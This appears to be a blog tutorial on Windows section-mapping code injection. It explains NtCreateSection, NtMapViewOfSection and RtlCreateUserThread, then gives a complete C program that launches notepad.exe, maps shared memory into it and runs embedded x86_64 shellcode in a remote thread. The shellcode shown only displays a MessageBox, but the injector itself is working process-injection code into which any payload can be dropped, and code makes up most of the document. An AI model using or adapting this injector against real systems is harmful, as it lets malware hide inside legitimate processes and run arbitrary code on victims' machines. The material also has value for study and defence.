# Section Code Injection
Written by 11philip22

## Introduction
A section object represents a section of memory that can be shared. A process can use a section object to share parts of its memory address space with other processes. Each memory section has one or more corresponding views. A view of a section is a part of the section that is actually visible to a process. The act of creating a view for a section is known as mapping a view of the section.  
  
In this post we will be using the following NTAPI functions.  
Documentation for these functions can be found at http://undocumented.ntinternals.net/
- NtCreateSection  
- NtMapViewOfSection  
- RtlCreateUserThread  

## Overview
1. Create a section with RWX protection.
2. Map a view of the section to the local process with RW protection.
3. Map a view of the section to the remote target process with RX protection.
4. Put our shellcode in the view mapped in the local process. This will get reflected in the remote process.
5. Call a remote thread in the target process on the mapped view that contains our shellcode.

## Implementation
In this PoC we will be using x86_64 MessageboxW shellcode. https://github.com/11philip22/MessageBoxShellcode

### Step by step
First we have to define function signatures for `ntdll.dll` functions.  
This is necessary since these functions are not defined in a header and each call to `GetProcAddress` needs to be cast to a function poiner. Also, with Intellisense, calling the function has the look and feel of calling a normal Win32 function in Visual Studio.
```C
typedef NTSTATUS(__stdcall* NTCREATESECTION)(HANDLE*, ULONG, POBJECT_ATTRIBUTES, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
typedef NTSTATUS(__stdcall* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(__stdcall* RTLCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);
```

Second we have to load these functions from `ntdll.dll` using `GetProcAddress` and `LoadLibraryW`.  
1337 h4x0rs can use `LdrGetProcAddress` and `LdrLoadDll`. More info on `LdrGetProcAddress` and `LdrLoadDll` can be found at http://undocumented.ntinternals.net/. And here is an example of its implementation: http://phasetw0.com/writing-optimized-windows-shellcode-in-c/
```C
NTCREATESECTION	pNtCreateSection;
NTMAPVIEWOFSECTION pNtMapViewOfSection;
RTLCREATEUSERTHREAD pRtlCreateUserThread;

CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
if (hNtdll) {
	pNtCreateSection = (NTCREATESECTION)GetProcAddress(hNtdll, "NtCreateSection");
	pNtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");
	pRtlCreateUserThread = (RTLCREATEUSERTHREAD)GetProcAddress(hNtdll, "RtlCreateUserThread");
	FreeLibrary(hNtdll);
}
else {
	return STATUS_OPEN_FAILED;
}
```

Now we create our section. We create it using RWX permissions.  
Please note that this PoC is returning `NTSTATUS` values and not `System Error Codes`. To convert `NTSTATUS` values one could use the `RtlNtStatusToDosError` function.
```C
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

NTSTATUS ntStatus;
HANDLE hSection = NULL;

ntStatus = pNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, 
	(PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
if (!NT_SUCCESS(ntStatus)) {
	return ntStatus;
}
```

Then we can proceed to map the section to out local process with RW permissions.
```C
SIZE_T dwReqBufSize = sizeof bMessageboxShellcode64;
PVOID pLocalSectionAddress = NULL;

ntStatus = pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalSectionAddress, 0, 0, NULL, &dwReqBufSize, 2, 0, PAGE_READWRITE);
if (!NT_SUCCESS(ntStatus)) {
	return ntStatus;
```

For our target process we are gonna open `notepad.exe` and get its handle.
```C
NTSTATUS ntStatus;
STARTUPINFOA startupInfo;
DWORD dwPid;
HANDLE hProcess;

ZeroMemory(&startupInfo, sizeof startupInfo);
startupInfo.cb = sizeof startupInfo;
ZeroMemory(&processInformation, sizeof processInformation);

if (!CreateProcessA(NULL, "\"notepad.exe\"", NULL, NULL, FALSE,
	DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
	return STATUS_OPEN_FAILED;
}

dwPid = processInformation.dwProcessId;
hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)
```

Now we can also map the section to our target process with RX permissions.
```C
SIZE_T dwReqBufSize = sizeof bMessageboxShellcode64;
PVOID pRemoteSectionAddress = NULL;

ntStatus = pNtMapViewOfSection(hSection, hProcess, &pRemoteSectionAddress, 0, 0, NULL, &dwReqBufSize, 2, 0, PAGE_EXECUTE_READ);
```

Copy shellcode to the local view, which will get reflected in the target process's mapped view.
```C
memcpy(pLocalSectionAddress, bMessageboxShellcode64, sizeof bMessageboxShellcode64);
```

Finally we call a thread on the mapped view containing our shellcode in the remote process.
```C
HANDLE hThread = NULL;

pRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, pRemoteSectionAddress, NULL, &hThread, NULL);
```

### Full code
```C
#include <Windows.h>

//
// Definitions
//
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_OPEN_FAILED  0xC0000136
#define STATUS_SUCCESS      0x00000000

typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;

//
// Define function signatures for ntdll functions
//
typedef NTSTATUS(__stdcall* NTCREATESECTION)(HANDLE*, ULONG, POBJECT_ATTRIBUTES, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
typedef NTSTATUS(__stdcall* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(__stdcall* RTLCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);

INT main() {
	NTSTATUS ntStatus;
	STARTUPINFOA startupInfo;
	PROCESS_INFORMATION processInformation;
	BYTE bMessageboxShellcode64[] = "\x48\x89\x5C\x24\x18\x48\x89\x7C\x24\x20\x55\x48\x8D\x6C\x24\xA9\x48\x81\xEC\xA0\x00\x00\x00\x33\xDB\xC7\x45\x17\x75\x00\x73\x00\xB9\x13\x9C\xBF\xBD\x48\x89\x5D\x67\x89\x5D\xFB\x89\x5D\x0B\x66\x89\x5D\x47\xC7\x45\x1B\x65\x00\x72\x00\xC7\x45\x1F\x33\x00\x32\x00\xC7\x45\x23\x2E\x00\x64\x00\xC7\x45\x27\x6C\x00\x6C\x00\xC7\x45\xD7\x4D\x65\x73\x73\xC7\x45\xDB\x61\x67\x65\x42\xC7\x45\xDF\x6F\x78\x57\x00\xC7\x45\x2F\x48\x00\x65\x00\xC7\x45\x33\x6C\x00\x6C\x00\xC7\x45\x37\x6F\x00\x20\x00\xC7\x45\x3B\x57\x00\x6F\x00\xC7\x45\x3F\x72\x00\x6C\x00\xC7\x45\x43\x64\x00\x21\x00\xC7\x45\xE7\x44\x00\x65\x00\xC7\x45\xEB\x6D\x00\x6F\x00\xC7\x45\xEF\x21\x00\x00\x00\xE8\x74\x00\x00\x00\xB9\xB5\x41\xD9\x5E\x48\x8B\xD8\xE8\x67\x00\x00\x00\x48\x8B\xF8\xC7\x45\xF7\x14\x00\x14\x00\x48\x8D\x45\x17\x33\xD2\x4C\x8D\x4D\x6F\x48\x89\x45\xFF\x4C\x8D\x45\xF7\x33\xC9\xFF\xD3\x48\x8B\x4D\x6F\x48\x8D\x45\xD7\x45\x33\xC0\x48\x89\x45\x0F\x4C\x8D\x4D\x67\xC7\x45\x07\x0C\x00\x0C\x00\x48\x8D\x55\x07\xFF\xD7\x45\x33\xC9\x4C\x8D\x45\xE7\x48\x8D\x55\x2F\x33\xC9\xFF\x55\x67\x4C\x8D\x9C\x24\xA0\x00\x00\x00\x49\x8B\x5B\x20\x49\x8B\x7B\x28\x49\x8B\xE3\x5D\xC3\xCC\xCC\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3";
	SIZE_T dwReqBufSize = sizeof bMessageboxShellcode64;
	LONG lRetVal = STATUS_SUCCESS;
	DWORD dwPid;
	LARGE_INTEGER sectionSize = { dwReqBufSize };
	HANDLE hSection = NULL;
	HANDLE hProcess;
	HANDLE hThread = NULL;
	PVOID pLocalSectionAddress = NULL;
	PVOID pRemoteSectionAddress = NULL;

	// Function pointers
	NTCREATESECTION	pNtCreateSection;
	NTMAPVIEWOFSECTION pNtMapViewOfSection;
	RTLCREATEUSERTHREAD pRtlCreateUserThread;

	//
	// Load required functions from ntdll
	//
	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (hNtdll) {
		pNtCreateSection = (NTCREATESECTION)GetProcAddress(hNtdll, "NtCreateSection");
		pNtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");
		pRtlCreateUserThread = (RTLCREATEUSERTHREAD)GetProcAddress(hNtdll, "RtlCreateUserThread");
		FreeLibrary(hNtdll);
	}
	else {
		return STATUS_OPEN_FAILED;
	}

	//
	// Create a section
	//
	ntStatus = pNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, 
		(PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(ntStatus)) {
		return ntStatus;
	}

	//
	// Map section to local process
	//
	ntStatus = pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalSectionAddress, 0, 0, NULL, &dwReqBufSize, 2, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(ntStatus)) {
		return ntStatus;
	}

	//
	// Create host process
	//
	ZeroMemory(&startupInfo, sizeof startupInfo);
	startupInfo.cb = sizeof startupInfo;
	ZeroMemory(&processInformation, sizeof processInformation);

	if (!CreateProcessA(NULL, "\"notepad.exe\"", NULL, NULL, FALSE,
		DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
		return STATUS_OPEN_FAILED;
	}

	dwPid = processInformation.dwProcessId;
	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
		lRetVal = STATUS_OPEN_FAILED;
		goto lblCleanup;
	}

	//
	// Map section to target process
	//
	ntStatus = pNtMapViewOfSection(hSection, hProcess, &pRemoteSectionAddress, 0, 0, NULL, &dwReqBufSize, 2, 0, PAGE_EXECUTE_READ);
	if (!NT_SUCCESS(ntStatus)) {
		lRetVal = ntStatus;
		goto lblCleanup;
	}
	
	//
	// copy shellcode to the local view, which will get reflected in the target process's mapped view
	//
	memcpy(pLocalSectionAddress, bMessageboxShellcode64, sizeof bMessageboxShellcode64);

	//
	// Call thread on section in remote process
	//
	ntStatus = pRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, pRemoteSectionAddress, NULL, &hThread, NULL);
	if (!NT_SUCCESS(ntStatus)) {
		lRetVal = ntStatus;
	}
	
lblCleanup:
	if (processInformation.hProcess) {
		CloseHandle(processInformation.hProcess);
	}

	if (processInformation.hThread) {
		CloseHandle(processInformation.hThread);
	}
	
	return lRetVal;
}
```

## References 
- https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views
- https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection
- http://undocumented.ntinternals.net/
- https://github.com/11philip22/CodeInjection/blob/master/SectionInjection/SectionInjection.c